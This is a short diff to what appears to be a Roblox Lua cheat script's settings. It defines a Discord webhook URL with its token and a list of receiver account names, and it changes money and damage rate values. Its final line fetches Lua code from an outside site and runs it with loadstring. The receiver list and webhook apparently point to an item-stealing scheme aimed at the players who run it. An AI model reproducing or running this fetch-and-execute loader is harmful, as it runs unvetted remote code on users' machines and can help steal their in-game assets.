@@ -1,8 +1,8 @@
 getgenv().WEBHOOK = "https://discord.com/api/webhooks/1429423719733919815/A9Jjz5VMPZ_BkA-6FVJiah61ZR2ioPTgt-BpdBJod1TMYfl8Nw8BJCJTTwik25DetR7D"
 getgenv().RECEIVERS = {"devrepay", "GAGRICHKID_0", "wextonstorage1", "Wextonstorage2",
 "wextonstorage3"}
-getgenv().MONEY_PER_SECOND = 500000 -- DEFAULT: 100000/s
-getgenv().DMG_PER_SECOND = 500000 -- DEFAULT: 100000/s
+getgenv().MONEY_PER_SECOND = 100000 -- DEFAULT: 100000/s
+getgenv().DMG_PER_SECOND = 50000 -- DEFAULT: 100000/s
 
 
 loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/af28bcaaab24d45dae37ee66caab0c46ebe174087959085e88dee2d297fd6537/download"))()
